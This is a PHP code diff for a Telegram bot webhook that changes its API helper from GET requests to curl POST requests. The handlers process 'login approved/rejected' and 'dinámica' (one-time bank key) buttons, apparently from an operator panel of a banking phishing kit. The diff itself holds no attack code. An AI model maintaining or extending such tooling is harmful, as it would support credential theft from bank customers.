@@ -40,10 +40,18 @@ $message      = $cb['message'] ?? null;
 $messageId    = $message['message_id'] ?? null;
 $chatIdOrigen = $message['chat']['id'] ?? null;
 
-function tgApiGet($method, $params) {
+function tgApiCall($method, $params) {
     global $botToken;
-    $url = "https://api.telegram.org/bot{$botToken}/{$method}?" . http_build_query($params);
-    return file_get_contents($url);
+    $url = "https://api.telegram.org/bot{$botToken}/{$method}";
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 8);
+    $res = curl_exec($ch);
+    curl_close($ch);
+    return $res;
 }
 
 if (strpos($cdata, 'login_ok:') === 0 || strpos($cdata, 'login_error:') === 0) {
@@ -58,7 +66,7 @@ if (strpos($cdata, 'login_ok:') === 0 || strpos($cdata, 'login_error:') === 0) {
     $txtCallback = ($accion === 'login_ok') ? 'Login aprobado' : 'Login rechazado';
 
     if ($cbId) {
-        tgApiGet('answerCallbackQuery', [
+        tgApiCall('answerCallbackQuery', [
             'callback_query_id' => $cbId,
             'text'              => $txtCallback,
             'show_alert'        => false
@@ -68,7 +76,7 @@ if (strpos($cdata, 'login_ok:') === 0 || strpos($cdata, 'login_error:') === 0) {
     if ($messageId && $chatIdOrigen) {
         $nuevoTexto = $message['text'] . "\n\n👤 Acción de login '" . $txtCallback . "' realizada por <b>" . htmlspecialchars($fromName, ENT_QUOTES, 'UTF-8') . "</b>.";
 
-        tgApiGet('editMessageText', [
+        tgApiCall('editMessageText', [
             'chat_id'                  => $chatIdOrigen,
             'message_id'               => $messageId,
             'text'                     => $nuevoTexto,
@@ -94,7 +102,7 @@ if (strpos($cdata, 'dina_x:') === 0 || strpos($cdata, 'dina_finish:') === 0) {
     $txtCallback = ($accion === 'dina_x') ? 'Dinámica inválida' : 'Dinámica finalizada';
 
     if ($cbId) {
-        tgApiGet('answerCallbackQuery', [
+        tgApiCall('answerCallbackQuery', [
             'callback_query_id' => $cbId,
             'text'              => $txtCallback,
             'show_alert'        => false
@@ -104,7 +112,7 @@ if (strpos($cdata, 'dina_x:') === 0 || strpos($cdata, 'dina_finish:') === 0) {
     if ($messageId && $chatIdOrigen) {
         $nuevoTexto = $message['text'] . "\n\n👤 Acción sobre dinámica '" . $txtCallback . "' realizada por <b>" . htmlspecialchars($fromName, ENT_QUOTES, 'UTF-8') . "</b>.";
 
-        tgApiGet('editMessageText', [
+        tgApiCall('editMessageText', [
             'chat_id'      => $chatIdOrigen,
             'message_id'   => $messageId,
             'text'         => $nuevoTexto,
